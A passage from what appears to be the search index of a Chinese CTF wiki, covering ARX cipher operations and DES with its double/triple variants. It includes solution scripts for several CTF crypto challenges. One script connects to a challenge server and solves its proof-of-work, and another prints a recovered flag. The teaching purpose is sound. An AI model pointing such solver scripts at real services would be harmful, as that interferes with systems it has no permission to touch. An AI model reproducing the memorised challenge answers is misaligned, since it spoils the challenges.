\u6709\u8bb8\u591a\u5e38\u89c1\u7684\u5757\u52a0\u5bc6\u7b97\u6cd5\u5728\u8f6e\u51fd\u6570\u4e2d\u53ea\u7528\u5230\u4e86\u8fd9 3 \u79cd\u57fa\u672c\u8fd0\u7b97\uff0c\u5178\u578b\u4f8b\u5b50\u5982 Salsa20\u3001Speck \u7b49\u3002\u53e6\u5916 IDEA \u4e5f\u91c7\u7528\u4e86\u7c7b\u4f3c\u7684\u57fa\u672c\u8fd0\u7b97\u6765\u6784\u5efa\u52a0\u89e3\u5bc6\u64cd\u4f5c\uff0c\u4e0d\u8fc7\u4ee5\u4e58\u6cd5\u4ee3\u66ff\u4e86\u79fb\u4f4d\u3002","title":"\u6982\u8ff0"},{"location":"crypto/blockcipher/arx-operations/#_2","text":"","title":"\u4f18\u7f3a\u70b9"},{"location":"crypto/blockcipher/arx-operations/#_3","text":"\u64cd\u4f5c\u7b80\u5355\uff0c\u8fd0\u7b97\u901f\u5ea6\u5feb \u6267\u884c\u65f6\u95f4\u4e3a\u5e38\u6570\uff0c\u53ef\u4ee5\u907f\u514d\u57fa\u4e8e\u65f6\u95f4\u7684\u6d4b\u4fe1\u9053\u653b\u51fb \u7ec4\u5408\u540e\u7684\u51fd\u6570\u8868\u8fbe\u80fd\u529b\u8db3\u591f\u5f3a\uff08\u53c2\u89c1\u4e0b\u65b9\u4f8b\u9898\uff09","title":"\u4f18\u70b9"},{"location":"crypto/blockcipher/arx-operations/#_4","text":"\u5728\u4e09\u79cd\u57fa\u672c\u8fd0\u7b97\u5f53\u4e2d\uff0cRotate\u3001Xor \u5bf9\u4e8e\u5355\u4e2a bit \u6765\u8bf4\u5747\u662f\u5b8c\u5168\u7ebf\u6027\u7684\u8fd0\u7b97\uff0c\u53ef\u80fd\u4f1a\u5e26\u6765\u4e00\u5b9a\u7684\u8106\u5f31\u6027(\u53c2\u89c1 Rotational cryptanalysis )","title":"\u7f3a\u70b9"},{"location":"crypto/blockcipher/arx-operations/#_5","text":"","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/arx-operations/#2018-ctf-primitive","text":"","title":"2018 *ctf primitive"},{"location":"crypto/blockcipher/arx-operations/#_6","text":"\u672c\u9898\u8981\u6c42\u6211\u4eec\u7ec4\u5408\u4e00\u5b9a\u6570\u76ee\u4ee5\u5185\u7684 Add-Rotate-Xor \u8fd0\u7b97\uff0c\u4f7f\u5f97\u83b7\u5f97\u7684\u52a0\u5bc6\u7b97\u6cd5\u80fd\u591f\u5c06\u56fa\u5b9a\u660e\u6587\u52a0\u5bc6\u6210\u6307\u5b9a\u7684\u968f\u673a\u5bc6\u6587\uff0c\u5373\u901a\u8fc7\u57fa\u7840\u8fd0\u7b97\u6765\u6784\u5efa\u4efb\u610f\u7f6e\u6362\u51fd\u6570\u3002\u6210\u529f\u6784\u5efa 3 \u6b21\u4e4b\u540e\u5373\u53ef\u83b7\u5f97 flag\u3002","title":"\u5206\u6790"},{"location":"crypto/blockcipher/arx-operations/#_7","text":"\u5bf9\u4e8e\u6a21 256 \u4e0b\u7684\u8fd0\u7b97\uff0c\u4e00\u79cd\u5178\u578b\u7684\u57fa\u4e8e ARX \u7684\u6362\u4f4d\u64cd\u4f5c\u53ef\u4ee5\u8868\u793a\u4e3a\u5982\u4e0b\u7ec4\u5408 RotateLeft_1(Add_255(RotateLeft_7(Add_2(x)))) \u4e0a\u8ff0\u51fd\u6570\u5bf9\u5e94\u4e86\u4e00\u4e2a\u5c06 254 \u548c 255 \u8fdb\u884c\u4ea4\u6362\uff0c\u540c\u65f6\u4fdd\u6301\u5176\u5b83\u6570\u5b57\u4e0d\u53d8\u7684\u7f6e\u6362\u8fd0\u7b97\u3002 \u76f4\u89c9\u4e0a\u6765\u8bf4\uff0c\u7531\u4e8e\u5728\u7b2c\u4e00\u6b65\u7684\u6a21\u52a0 2 \u8fd0\u7b97\u4e2d\uff0c\u4ec5\u6709\u8f93\u5165\u4e3a 254\u3001255 \u65f6\u4f1a\u53d1\u751f\u8fdb\u4f4d\uff0c\u8be5\u7ec4\u5408\u51fd\u6570\u5f97\u4ee5\u533a\u522b\u5bf9\u5f85\u8fd9\u4e00\u60c5\u51b5\u3002 \u5229\u7528\u4e0a\u8ff0\u539f\u5b50\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u51fa\u4efb\u610f\u4e24\u4e2a\u6570\u5b57 a,b \u7684\u7f6e\u6362\uff0c\u7ed3\u5408 Xor \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u51cf\u5c11\u6240\u9700\u7684\u57fa\u672c\u64cd\u4f5c\u6570\u76ee\uff0c\u4f7f\u5176\u6ee1\u8db3\u9898\u76ee\u7ed9\u51fa\u7684\u9650\u5236\u3002\u4e00\u79cd\u53ef\u80fd\u7684\u64cd\u4f5c\u6b65\u9aa4\u5982\u4e0b\uff1a \u5bf9\u4e8e a,b \uff0c\u901a\u8fc7\u6a21\u52a0\u64cd\u4f5c\u4f7f\u5f97 a \u4e3a0 \u901a\u8fc7\u53f3\u79fb\u4f7f\u5f97b\u7684\u6700\u4f4e\u4f4d\u4e3a 1 \u82e5 b \u4e0d\u4e3a 1\uff0c\u8fdb\u884c Xor 1, Add 255 \u64cd\u4f5c\uff0c\u4fdd\u6301 a \u4ecd\u7136\u4e3a0\uff0c\u540c\u65f6 b \u7684\u6570\u503c\u51cf\u5c0f \u91cd\u590d\u64cd\u4f5c2-3\u76f4\u81f3 b \u4e3a1 \u8fdb\u884c Add 254 \u53ca\u6362\u4f4d\u64cd\u4f5c\uff0c\u4ea4\u6362 a,b \u5bf9\u4e8e\u6362\u4f4d\u4ee5\u5916\u7684\u6240\u6709\u64cd\u4f5c\uff0c\u52a0\u5165\u5bf9\u5e94\u7684\u9006\u8fd0\u7b97\uff0c\u786e\u4fdd a,b \u4ee5\u5916\u7684\u6570\u503c\u4e0d\u53d8 \u5b8c\u6574\u7684\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import string from hashlib import sha256 #context.log_level='debug' def dopow (): chal = c . recvline () post = chal [ 12 : 28 ] tar = chal [ 33 : - 1 ] c . recvuntil ( ':' ) found = iters . bruteforce ( lambda x : sha256 ( x + post ) . hexdigest () == tar , string . ascii_letters + string . digits , 4 ) c . sendline ( found ) #c = remote('127.0.0.1',10001) c = remote ( '47.75.4.252' , 10001 ) dopow () pt = 'GoodCipher' def doswap ( a , b ): if a == b : return if a > b : tmp = b b = a a = tmp ans = [] ans . append (( 0 , 256 - a )) b -= a a = 0 while b != 1 : tmp = 0 lo = 1 while b & lo == 0 : lo <<= 1 tmp += 1 if b == lo : ans . append (( 1 , 8 - tmp )) break if tmp != 0 : ans . append (( 1 , 8 - tmp )) b >>= tmp ans . append (( 2 , 1 )) b ^= 1 ans . append (( 0 , 255 )) b -= 1 ans . append (( 0 , 254 )) for a , b in ans : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in [( 0 , 2 ),( 1 , 7 ),( 0 , 255 ),( 1 , 1 )]: c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for a , b in ans [:: - 1 ]: if a == 0 : c . sendline ( ' %d %d ' % ( a , 256 - b )) elif a == 1 : c . sendline ( ' %d %d ' % ( a , 8 - b )) elif a == 2 : c . sendline ( ' %d %d ' % ( a , b )) c . recvline () for i in range ( 3 ): print i m = range ( 256 ) c . recvuntil ( 'ciphertext is ' ) ct = c . recvline () . strip () ct = ct . decode ( 'hex' ) assert len ( ct ) == 10 for i in range ( 10 ): a = ord ( ct [ i ]) b = ord ( pt [ i ]) #print m[a],b doswap ( m [ a ], b ) for j in range ( 256 ): if m [ j ] == b : m [ j ] = m [ a ] m [ a ] = b break c . sendline ( '-1' ) c . recvuntil ( 'Your flag here. \\n ' ) print c . recvline ()","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/blockcipher/des/","text":"DES \u00b6 \u57fa\u672c\u4ecb\u7ecd \u00b6 Data Encryption Standard(DES)\uff0c\u6570\u636e\u52a0\u5bc6\u6807\u51c6\uff0c\u662f\u5178\u578b\u7684\u5757\u52a0\u5bc6\uff0c\u5176\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u8f93\u5165 64 \u4f4d\u3002 \u8f93\u51fa 64 \u4f4d\u3002 \u5bc6\u94a5 64 \u4f4d\uff0c\u4f7f\u7528 64 \u4f4d\u5bc6\u94a5\u4e2d\u7684 56 \u4f4d\uff0c\u5269\u4f59\u7684 8 \u4f4d\u8981\u4e48\u4e22\u5f03\uff0c\u8981\u4e48\u4f5c\u4e3a\u5947\u5076\u6821\u9a8c\u4f4d\u3002 Feistel \u8fed\u4ee3\u7ed3\u6784 \u660e\u6587\u7ecf\u8fc7 16 \u8f6e\u8fed\u4ee3\u5f97\u5230\u5bc6\u6587\u3002 \u5bc6\u6587\u7ecf\u8fc7\u7c7b\u4f3c\u7684 16 \u8f6e\u8fed\u4ee3\u5f97\u5230\u660e\u6587\u3002 \u57fa\u672c\u6d41\u7a0b \u00b6 \u7ed9\u51fa\u4e00\u5f20\u7b80\u5355\u7684 DES \u6d41\u7a0b\u56fe \u3002 \u52a0\u5bc6 \u00b6 \u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4e00\u4e0b\u6bcf\u4e00\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b L_{i+1}=R_i L_{i+1}=R_i R_{i+1}=L_i\\oplus F(R_i,K_i) R_{i+1}=L_i\\oplus F(R_i,K_i) \u90a3\u4e48\u5728\u6700\u540e\u7684 Permutation \u4e4b\u524d\uff0c\u5bf9\u5e94\u7684\u5bc6\u6587\u4e3a (R_{n+1},L_{n+1}) (R_{n+1},L_{n+1}) \u3002 \u89e3\u5bc6 \u00b6 \u90a3\u4e48\u89e3\u5bc6\u5982\u4f55\u89e3\u5bc6\u5462\uff1f\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u628a\u5bc6\u6587\u5148\u8fdb\u884c\u9006\u7f6e\u6362\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u4e00\u8f6e\u7684\u8f93\u51fa\u3002\u6211\u4eec\u8fd9\u65f6\u8003\u8651\u6bcf\u4e00\u8f6e R_i=L_{i+1} R_i=L_{i+1} L_i=R_{i+1}\\oplus F(L_{i+1},K_i) L_i=R_{i+1}\\oplus F(L_{i+1},K_i) \u56e0\u6b64\uff0c (L_0,R_0) (L_0,R_0) \u5c31\u662f\u52a0\u5bc6\u65f6\u7b2c\u4e00\u6b21\u7f6e\u6362\u540e\u7684\u660e\u6587\u3002\u6211\u4eec\u53ea\u9700\u8981\u518d\u6267\u884c\u9006\u7f6e\u6362\u5c31\u53ef\u4ee5\u83b7\u5f97\u660e\u6587\u4e86\u3002 \u53ef\u4ee5\u770b\u51fa\uff0cDES \u52a0\u89e3\u5bc6\u4f7f\u7528\u540c\u4e00\u5957\u903b\u8f91\uff0c\u53ea\u662f\u5bc6\u94a5\u4f7f\u7528\u7684\u987a\u5e8f\u4e0d\u4e00\u81f4\u3002 \u6838\u5fc3\u90e8\u4ef6 \u00b6 DES \u4e2d\u7684\u6838\u5fc3\u90e8\u4ef6\u4e3b\u8981\u5305\u62ec\uff08\u8fd9\u91cc\u53ea\u7ed9\u51fa\u52a0\u5bc6\u8fc7\u7a0b\u7684\uff09 \u521d\u59cb\u7f6e\u6362 F \u51fd\u6570 E \u6269\u5c55\u51fd\u6570 S \u76d2\uff0c\u8bbe\u8ba1\u6807\u51c6\u672a\u7ed9\u51fa\u3002 P \u7f6e\u6362 \u6700\u540e\u7f6e\u6362 \u5176\u4e2d F \u51fd\u6570\u5982\u4e0b \u5982\u679c\u5bf9 DES \u66f4\u52a0\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u8fdb\u884c\u66f4\u52a0\u4ed4\u7ec6\u5730\u7814\u7a76\u3002\u6b22\u8fce\u63d0\u4f9b PR\u3002 \u884d\u751f \u00b6 \u5728 DES \u7684\u57fa\u7840\u4e0a\uff0c\u884d\u751f\u4e86\u4ee5\u4e0b\u4e24\u79cd\u52a0\u5bc6\u65b9\u5f0f \u53cc\u91cd DES \u4e09\u79cd DES \u53cc\u91cd DES \u00b6 \u53cc\u91cd DES \u4f7f\u7528\u4e24\u4e2a\u5bc6\u94a5\uff0c\u957f\u5ea6\u4e3a 112 \u6bd4\u7279\u3002\u52a0\u5bc6\u65b9\u5f0f\u5982\u4e0b C=E_{k2}(E_{k1}(P)) C=E_{k2}(E_{k1}(P)) \u4f46\u662f\u53cc\u91cd DES \u4e0d\u80fd\u62b5\u6297\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u4e24\u4e2a\u96c6\u5408 I={E_{k1}(P)} I={E_{k1}(P)} J=D_{k2}(C) J=D_{k2}(C) \u5373\u5206\u522b\u679a\u4e3e K1 \u548c K2 \u5206\u522b\u5bf9 P \u8fdb\u884c\u52a0\u5bc6\u548c\u5bf9 C \u8fdb\u884c\u89e3\u5bc6\u3002 \u5728\u6211\u4eec\u5bf9 P \u8fdb\u884c\u52a0\u5bc6\u5b8c\u6bd5\u540e\uff0c\u53ef\u4ee5\u5bf9\u52a0\u5bc6\u7ed3\u679c\u8fdb\u884c\u6392\u5e8f\uff0c\u8fd9\u6837\u7684\u590d\u6742\u5ea6\u4e3a 2^nlog(2^n)=O(n2^n) 2^nlog(2^n)=O(n2^n) \u5f53\u6211\u4eec\u5bf9 C \u8fdb\u884c\u89e3\u5bc6\u65f6\uff0c\u53ef\u4ee5\u6bcf\u89e3\u5bc6\u4e00\u4e2a\uff0c\u5c31\u53bb\u5bf9\u5e94\u7684\u8868\u4e2d\u67e5\u8be2\u3002 \u603b\u7684\u590d\u6742\u5ea6\u4e3a\u8fd8\u662f O(n2^n) O(n2^n) \u3002 \u4e09\u91cd DES \u00b6 \u4e09\u91cd DES \u7684\u52a0\u89e3\u5bc6\u65b9\u5f0f\u5982\u4e0b C=E_{k3}(D_{k2}(E_{k1}(P))) C=E_{k3}(D_{k2}(E_{k1}(P))) P=D_{k1}(E_{k2}(D_{k3}(C))) P=D_{k1}(E_{k2}(D_{k3}(C))) \u5728\u9009\u62e9\u5bc6\u94a5\u65f6\uff0c\u53ef\u4ee5\u6709\u4e24\u79cd\u65b9\u6cd5 3 \u4e2a\u4e0d\u540c\u7684\u5bc6\u94a5\uff0ck1\uff0ck2\uff0ck3 \u4e92\u76f8\u72ec\u7acb\uff0c\u4e00\u5171 168 \u6bd4\u7279\u3002 2 \u4e2a\u4e0d\u540c\u7684\u5bc6\u94a5\uff0ck1 \u4e0e k2 \u72ec\u7acb\uff0ck3=k1\uff0c112 \u6bd4\u7279\u3002 \u653b\u51fb\u65b9\u6cd5 \u00b6 \u5dee\u5206\u653b\u51fb \u7ebf\u6027\u653b\u51fb 2018 N1CTF N1ES \u00b6 \u57fa\u672c\u4ee3\u7801\u5982\u4e0b # -*- coding: utf-8 -*- def round_add ( a , b ): f = lambda x , y : x + y - 2 * ( x & y ) res = '' for i in range ( len ( a )): res += chr ( f ( ord ( a [ i ]), ord ( b [ i ]))) return res def permutate ( table , block ): return list ( map ( lambda x : block [ x ], table )) def string_to_bits ( data ): data = [ ord ( c ) for c in data ] l = len ( data ) * 8 result = [ 0 ] * l pos = 0 for ch in data : for i in range ( 0 , 8 ): result [( pos << 3 ) + i ] = ( ch >> i ) & 1 pos += 1 return result s_box = [ 54 , 132 , 138 , 83 , 16 , 73 , 187 , 84 , 146 , 30 , 95 , 21 , 148 , 63 , 65 , 189 , 188 , 151 , 72 , 161 , 116 , 63 , 161 , 91 , 37 , 24 , 126 , 107 , 87 , 30 , 117 , 185 , 98 , 90 , 0 , 42 , 140 , 70 , 86 , 0 , 42 , 150 , 54 , 22 , 144 , 153 , 36 , 90 , 149 , 54 , 156 , 8 , 59 , 40 , 110 , 56 , 1 , 84 , 103 , 22 , 65 , 17 , 190 , 41 , 99 , 151 , 119 , 124 , 68 , 17 , 166 , 125 , 95 , 65 , 105 , 133 , 49 , 19 , 138 , 29 , 110 , 7 , 81 , 134 , 70 , 87 , 180 , 78 , 175 , 108 , 26 , 121 , 74 , 29 , 68 , 162 , 142 , 177 , 143 , 86 , 129 , 101 , 117 , 41 , 57 , 34 , 177 , 103 , 61 , 135 , 191 , 74 , 69 , 147 , 90 , 49 , 135 , 124 , 106 , 19 , 8 9 , 38 , 21 , 41 , 17 , 155 , 83 , 38 , 159 , 179 , 19 , 157 , 68 , 105 , 151 , 166 , 171 , 122 , 179 , 114 , 52 , 183 , 89 , 107 , 113 , 65 , 161 , 141 , 18 , 121 , 95 , 4 , 95 , 101 , 81 , 156 , 17 , 190 , 38 , 84 , 9 , 171 , 180 , 59 , 45 , 15 , 34 , 89 , 75 , 164 , 190 , 140 , 6 , 41 , 188 , 77 , 165 , 105 , 5 , 107 , 31 , 183 , 107 , 141 , 66 , 63 , 10 , 9 , 125 , 50 , 2 , 153 , 156 , 162 , 186 , 76 , 158 , 153 , 117 , 9 , 77 , 156 , 11 , 145 , 12 , 169 , 52 , 57 , 161 , 7 , 158 , 110 , 191 , 43 , 82 , 186 , 49 , 102 , 166 , 31 , 41 , 5 , 189 , 27 ] def generate ( o ): k = permutate ( s_box , o ) b = [] for i in range ( 0 , len ( k ), 7 ): b . append ( k [ i : i + 7 ] + [ 1 ]) c = [] for i in range ( 32 ): pos = 0 x = 0 for j in b [ i ]: x += ( j << pos ) pos += 1 c . append (( 0x10001 ** x ) % ( 0x7f )) return c class N1ES : def __init__ ( self , key ): if ( len ( key ) != 24 or isinstance ( key , bytes ) == False ): raise Exception ( \"key must be 24 bytes long\" ) self . key = key self . gen_subkey () def gen_subkey ( self ): o = string_to_bits ( self . key ) k = [] for i in range ( 8 ): o = generate ( o ) k . extend ( o ) o = string_to_bits ([ chr ( c ) for c in o [ 0 : 24 ]]) self . Kn = [] for i in range ( 32 ): self . Kn . append ( map ( chr , k [ i * 8 : i * 8 + 8 ])) return def encrypt ( self , plaintext ): if ( len ( plaintext ) % 16 != 0 or isinstance ( plaintext , bytes ) == False ): raise Exception ( \"plaintext must be a multiple of 16 in length\" ) res = '' for i in range ( len ( plaintext ) / 16 ): block = plaintext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ round_cnt ])) L , R = R , L res += L + R return res \u663e\u7136\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u4e00\u4e2a Feistel \u52a0\u5bc6\u7684\u65b9\u5f0f\uff0c\u89e3\u5bc6\u51fd\u6570\u5982\u4e0b def decrypt ( self , ciphertext ): res = '' for i in range ( len ( ciphertext ) / 16 ): block = ciphertext [ i * 16 :( i + 1 ) * 16 ] L = block [: 8 ] R = block [ 8 :] for round_cnt in range ( 32 ): L , R = R , ( round_add ( L , self . Kn [ 31 - round_cnt ])) L , R = R , L res += L + R return res \u6700\u540e\u7ed3\u679c\u4e3a \u279c baby_N1ES cat challenge.py from N1ES import N1ES import base64 key = \"wxy191iss00000000000cute\" n1es = N1ES ( key ) flag = \"N1CTF{*****************************************}\" cipher = n1es.encrypt ( flag ) #print base64.b64encode(cipher) # HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx cipher = 'HRlgC2ReHW1/WRk2DikfNBo1dl1XZBJrRR9qECMNOjNHDktBJSxcI1hZIz07YjVx' cipher = base64.b64decode ( cipher ) print n1es.decrypt ( cipher ) \u279c baby_N1ES python challenge.py N1CTF { F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/ } 2019 CISCN part_des \u00b6 \u9898\u76ee\u53ea\u7ed9\u4e86\u4e00\u4e2a\u6587\u4ef6\uff1a Round n part_encode-> 0x92d915250119e12b Key map -> 0xe0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84 \u8003\u8651\u5230\u9898\u76ee\u540d\u4ee5\u53ca\u6570\u636e\u7279\u5f81\uff0c Round n part_encode \u4e3a\u6267\u884cn\u8f6edes\u7684\u4e2d\u95f4\u7ed3\u679c\uff0c Key map \u5e94\u4e3ades\u7684\u5b50\u5bc6\u94a5\uff0c\u8981\u8fd8\u539f\u51fa\u660e\u6587\u53ea\u9700\u8fdb\u884cn\u8f6edes\u52a0\u5bc6\u7684\u9006\u8fc7\u7a0b\u5373\u53ef\uff0c\u89e3\u5bc6\u65f6\u6ce8\u610f\u4ee5\u4e0b\u4e09\u70b9\u3002 \u5b50\u5bc6\u94a5\u7684\u9009\u53d6\uff0c\u5bf9\u4e8e\u53ea\u8fdb\u884c\u4e86n\u8f6e\u7684\u52a0\u5bc6\u7ed3\u679c\uff0c\u89e3\u5bc6\u65f6\u5e94\u4f9d\u6b21\u4f7f\u7528\u5bc6\u94a5 n, n-1..., 1\u3002 des \u6700\u540e\u4e00\u8f6e\u540e\u7684\u64cd\u4f5c\uff0c\u672a\u5b8c\u6210\u7684 des \u6ca1\u6709\u4ea4\u6362\u5de6\u53f3\u4e24\u90e8\u5206\u548c\u9006\u521d\u59cb\u7f6e\u6362\uff0c\u56e0\u6b64\u89e3\u5bc6\u65f6\u6211\u4eec\u5e94\u5148\u5bf9\u5bc6\u6587\u8fdb\u884c\u8fd9\u4e24\u6b65\u64cd\u4f5c\u3002 n \u7684\u9009\u62e9\uff0c\u5728\u672c\u9898\u4e2d\uff0c\u6211\u4eec\u5e76\u4e0d\u77e5\u9053 n\uff0c\u4f46\u8fd9\u65e0\u5173\u7d27\u8981\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u6240\u6709\u53ef\u80fd\u7684\u53d6\u503c\uff080-15\uff09flag\u5e94\u4e3aascii\u5b57\u7b26\u4e32\u3002 \u89e3\u9898\u4ee3\u7801 kkk = 16 def bit_rot_left ( lst , pos ): return lst [ pos :] + lst [: pos ] class DES : IP = [ 58 , 50 , 42 , 34 , 26 , 18 , 10 , 2 , 60 , 52 , 44 , 36 , 28 , 20 , 12 , 4 , 62 , 54 , 46 , 38 , 30 , 22 , 14 , 6 , 64 , 56 , 48 , 40 , 32 , 24 , 16 , 8 , 57 , 49 , 41 , 33 , 25 , 17 , 9 , 1 , 59 , 51 , 43 , 35 , 27 , 19 , 11 , 3 , 61 , 53 , 45 , 37 , 29 , 21 , 13 , 5 , 63 , 55 , 47 , 39 , 31 , 23 , 15 , 7 ] IP_re = [ 40 , 8 , 48 , 16 , 56 , 24 , 64 , 32 , 39 , 7 , 47 , 15 , 55 , 23 , 63 , 31 , 38 , 6 , 46 , 14 , 54 , 22 , 62 , 30 , 37 , 5 , 45 , 13 , 53 , 21 , 61 , 29 , 36 , 4 , 44 , 12 , 52 , 20 , 60 , 28 , 35 , 3 , 43 , 11 , 51 , 19 , 59 , 27 , 34 , 2 , 42 , 10 , 50 , 18 , 58 , 26 , 33 , 1 , 41 , 9 , 49 , 17 , 57 , 25 ] Pbox = [ 16 , 7 , 20 , 21 , 29 , 12 , 28 , 17 , 1 , 15 , 23 , 26 , 5 , 18 , 31 , 10 , 2 , 8 , 24 , 14 , 32 , 27 , 3 , 9 , 19 , 13 , 30 , 6 , 22 , 11 , 4 , 25 ] E = [ 32 , 1 , 2 , 3 , 4 , 5 , 4 , 5 , 6 , 7 , 8 , 9 , 8 , 9 , 10 , 11 , 12 , 13 , 12 , 13 , 14 , 15 , 16 , 17 , 16 , 17 , 18 , 19 , 20 , 21 , 20 , 21 , 22 , 23 , 24 , 25 , 24 , 25 , 26 , 27 , 28 , 29 , 28 , 29 , 30 , 31 , 32 , 1 ] PC1 = [ 57 , 49 , 41 , 33 , 25 , 17 , 9 , 1 , 58 , 50 , 42 , 34 , 26 , 18 , 10 , 2 , 59 , 51 , 43 , 35 , 27 , 19 , 11 , 3 , 60 , 52 , 44 , 36 , 63 , 55 , 47 , 39 , 31 , 23 , 15 , 7 , 62 , 54 , 46 , 38 , 30 , 22 , 14 , 6 , 61 , 53 , 45 , 37 , 29 , 21 , 13 , 5 , 28 , 20 , 12 , 4 ] PC2 = [ 14 , 17 , 11 , 24 , 1 , 5 , 3 , 28 , 15 , 6 , 21 , 10 , 23 , 19 , 12 , 4 , 26 , 8 , 16 , 7 , 27 , 20 , 13 , 2 , 41 , 52 , 31 , 37 , 47 , 55 , 30 , 40 , 51 , 45 , 33 , 48 , 44 , 49 , 39 , 56 , 34 , 53 , 46 , 42 , 50 , 36 , 29 , 32 ] Sbox = [ [ [ 14 , 4 , 13 , 1 , 2 , 15 , 11 , 8 , 3 , 10 , 6 , 12 , 5 , 9 , 0 , 7 ], [ 0 , 15 , 7 , 4 , 14 , 2 , 13 , 1 , 10 , 6 , 12 , 11 , 9 , 5 , 3 , 8 ], [ 4 , 1 , 14 , 8 , 13 , 6 , 2 , 11 , 15 , 12 , 9 , 7 , 3 , 10 , 5 , 0 ], [ 15 , 12 , 8 , 2 , 4 , 9 , 1 , 7 , 5 , 11 , 3 , 14 , 10 , 0 , 6 , 13 ], ], [ [ 15 , 1 , 8 , 14 , 6 , 11 , 3 , 4 , 9 , 7 , 2 , 13 , 12 , 0 , 5 , 10 ], [ 3 , 13 , 4 , 7 , 15 , 2 , 8 , 14 , 12 , 0 , 1 , 10 , 6 , 9 , 11 , 5 ], [ 0 , 14 , 7 , 11 , 10 , 4 , 13 , 1 , 5 , 8 , 12 , 6 , 9 , 3 , 2 , 15 ], [ 13 , 8 , 10 , 1 , 3 , 15 , 4 , 2 , 11 , 6 , 7 , 12 , 0 , 5 , 14 , 9 ], ], [ [ 10 , 0 , 9 , 14 , 6 , 3 , 15 , 5 , 1 , 13 , 12 , 7 , 11 , 4 , 2 , 8 ], [ 13 , 7 , 0 , 9 , 3 , 4 , 6 , 10 , 2 , 8 , 5 , 14 , 12 , 11 , 15 , 1 ], [ 13 , 6 , 4 , 9 , 8 , 15 , 3 , 0 , 11 , 1 , 2 , 12 , 5 , 10 , 14 , 7 ], [ 1 , 10 , 13 , 0 , 6 , 9 , 8 , 7 , 4 , 15 , 14 , 3 , 11 , 5 , 2 , 12 ], ], [ [ 7 , 13 , 14 , 3 , 0 , 6 , 9 , 10 , 1 , 2 , 8 , 5 , 11 , 12 , 4 , 15 ], [ 13 , 8 , 11 , 5 , 6 , 15 , 0 , 3 , 4 , 7 , 2 , 12 , 1 , 10 , 14 , 9 ], [ 10 , 6 , 9 , 0 , 12 , 11 , 7 , 13 , 15 , 1 , 3 , 14 , 5 , 2 , 8 , 4 ], [ 3 , 15 , 0 , 6 , 10 , 1 , 13 , 8 , 9 , 4 , 5 , 11 , 12 , 7 , 2 , 14 ], ], [ [ 2 , 12 , 4 , 1 , 7 , 10 , 11 , 6 , 8 , 5 , 3 , 15 , 13 , 0 , 14 , 9 ], [ 14 , 11 , 2 , 12 , 4 , 7 , 13 , 1 , 5 , 0 , 15 , 10 , 3 , 9 , 8 , 6 ], [ 4 , 2 , 1 , 11 , 10 , 13 , 7 , 8 , 15 , 9 , 12 , 5 , 6 , 3 , 0 , 14 ], [ 11 , 8 , 12 , 7 , 1 , 14 , 2 , 13 , 6 , 15 , 0 , 9 , 10 , 4 , 5 , 3 ], ], [ [ 12 , 1 , 10 , 15 , 9 , 2 , 6 , 8 , 0 , 13 , 3 , 4 , 14 , 7 , 5 , 11 ], [ 10 , 15 , 4 , 2 , 7 , 12 , 9 , 5 , 6 , 1 , 13 , 14 , 0 , 11 , 3 , 8 ], [ 9 , 14 , 15 , 5 , 2 , 8 , 12 , 3 , 7 , 0 , 4 , 10 , 1 , 13 , 11 , 6 ], [ 4 , 3 , 2 , 12 , 9 , 5 , 15 , 10 , 11 , 14 , 1 , 7 , 6 , 0 , 8 , 13 ], ], [ [ 4 , 11 , 2 , 14 , 15 , 0 , 8 , 13 , 3 , 12 , 9 , 7 , 5 , 10 , 6 , 1 ], [ 13 , 0 , 11 , 7 , 4 , 9 , 1 , 10 , 14 , 3 , 5 , 12 , 2 , 15 , 8 , 6 ], [ 1 , 4 , 11 , 13 , 12 , 3 , 7 , 14 , 10 , 15 , 6 , 8 , 0 , 5 , 9 , 2 ], [ 6 , 11 , 13 , 8 , 1 , 4 , 10 , 7 , 9 , 5 , 0 , 15 , 14 , 2 , 3 , 12 ], ], [ [ 13 , 2 , 8 , 4 , 6 , 15 , 11 , 1 , 10 , 9 , 3 , 14 , 5 , 0 , 12 , 7 ], [ 1 , 15 , 13 , 8 , 10 , 3 , 7 , 4 , 12 , 5 , 6 , 11 , 0 , 14 , 9 , 2 ], [ 7 , 11 , 4 , 1 , 9 , 12 , 14 , 2 , 0 , 6 , 10 , 13 , 15 , 3 , 5 , 8 ], [ 2 , 1 , 14 , 7 , 4 , 10 , 8 , 13 , 15 , 12 , 9 , 0 , 3 , 5 , 6 , 11 ], ] ] rout = [ 1 , 1 , 2 , 2 , 2 , 2 , 2 , 2 , 1 , 2 , 2 , 2 , 2 , 2 , 2 , 1 ] def __init__ ( self ): self . subkey = [[[ 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 1 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 0 , 1 ], [ 1 , 1 , 1 , 1 , 0 , 0 , 